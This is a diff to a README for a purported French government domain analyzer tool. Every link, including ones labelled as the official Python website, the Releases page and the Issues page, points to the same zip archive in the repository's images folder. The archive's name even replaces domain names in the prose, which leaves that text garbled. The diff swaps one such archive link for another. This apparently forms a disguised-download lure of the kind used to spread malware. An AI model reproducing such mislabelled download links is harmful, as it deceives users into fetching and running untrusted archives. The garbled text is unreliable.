@@ -1,24 +1,24 @@
 # 🔍 FR-Gouv-Domains-Analyzer - Easily Analyze French Government Domains
 
 ## 🔗 Download
-[![Download](https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip)](https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip)
+[![Download](https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip)](https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip)
 
 ## 🚀 Getting Started
-Welcome to FR-Gouv-Domains-Analyzer! This tool helps you analyze and monitor sites ending in https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip With it, you can easily check the status of French government websites.
+Welcome to FR-Gouv-Domains-Analyzer! This tool helps you analyze and monitor sites ending in https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip With it, you can easily check the status of French government websites.
 
 ## 📋 System Requirements
 Before downloading and running the tool, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Sierra or later, or any recent Linux distribution.
-- **Python:** Version 3.7 or above is required. If you do not have Python installed, download it from the official [Python website](https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip).
+- **Python:** Version 3.7 or above is required. If you do not have Python installed, download it from the official [Python website](https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip).
 - **Internet Connection:** This tool requires an internet connection to perform analyses.
 
 ## 💾 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip) to download the software.
+To get started, visit the [Releases page](https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip) to download the software.
 
 1. Click on the link above.
 2. Look for the latest release. It will be at the top of the page.
-3. Download the appropriate file for your operating system. For Windows, you may see a `.exe` file. For macOS, look for a `.dmg` file. For Linux, you might find a `https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip` or similar package.
+3. Download the appropriate file for your operating system. For Windows, you may see a `.exe` file. For macOS, look for a `.dmg` file. For Linux, you might find a `https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip` or similar package.
 4. Once the file downloads, follow these steps based on your operating system:
 
    ### Windows
@@ -33,7 +33,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Chal
 
    ### Linux
    - Navigate to your Downloads folder using the terminal.
-   - Extract the downloaded file with a command like `tar -xvzf https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip`.
+   - Extract the downloaded file with a command like `tar -xvzf https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip`.
    - Move into the extracted directory using `cd foldername`.
    - Run the application using the provided executable. You may need to give it permission first by running `chmod +x filename`.
 
@@ -42,7 +42,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Chal
 ## ⚙️ How to Use the Tool
 1. Launch the application by clicking the icon.
 2. You will see a simple interface with an input box.
-3. Enter the URL of a https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip website you want to analyze.
+3. Enter the URL of a https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip website you want to analyze.
 4. Press the "Analyze" button to start the process.
 5. Review the results, which will show details like response time, uptime percentage, and other relevant data.
 
@@ -69,7 +69,7 @@ If you encounter any problems, please check the “Issues” section on our GitH
 ## 🌐 Community & Support
 Join our community to share your experiences and get help from other users. You can connect with us through the following platforms:
 
-- **GitHub:** [FR-Gouv-Domains-Analyzer Issues](https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip)
+- **GitHub:** [FR-Gouv-Domains-Analyzer Issues](https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip)
 - **Forum:** Engage with other users and developers to exchange tips and advice.
 
 ## 🛠️ Contributing
@@ -78,4 +78,4 @@ We welcome contributions! If you would like to help improve the FR-Gouv-Domains-
 ## 🤝 Acknowledgments
 Thank you for using FR-Gouv-Domains-Analyzer. We appreciate your interest in analyzing French government domains. Your support helps improve the tool for everyone. 
 
-For any additional questions, visit our [Releases page](https://raw.githubusercontent.com/Chaleeishim/FR-Gouv-Domains-Analyzer/main/images/FR-Gouv-Domains-Analyzer_v3.4-alpha.5.zip) and feel free to reach out.
+For any additional questions, visit our [Releases page](https://github.com/Chaleeishim/FR-Gouv-Domains-Analyzer/raw/refs/heads/main/images/Analyzer_Domains_Gouv_F_v2.9.zip) and feel free to reach out.
